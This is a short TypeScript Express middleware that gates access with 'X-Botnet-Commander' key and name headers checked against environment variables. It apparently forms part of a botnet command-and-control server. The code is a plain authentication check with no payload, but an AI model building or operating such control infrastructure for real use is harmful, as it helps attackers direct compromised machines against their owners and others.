import {Request, Response, NextFunction} from 'express'

export const authCommander = (req: Request, res: Response, next: NextFunction) => {
    try {
        const authData = {
            key: process.env.COMMANDER_KEY,
            name: process.env.COMMANDER_NAME
        }

        const authKey = req.header('X-Botnet-Commander-Key')
        const authName = req.header('X-Botnet-Commander-Name')

        if(authKey === authData.key && authName === authData.name) {
            next()
        } else {
            res.status(403).json({
                'status': 'Failed',
                'message': "You're not our commander! 👿"
            })
        }
    } catch (error) {
        res.status(500).json(error)
    }
}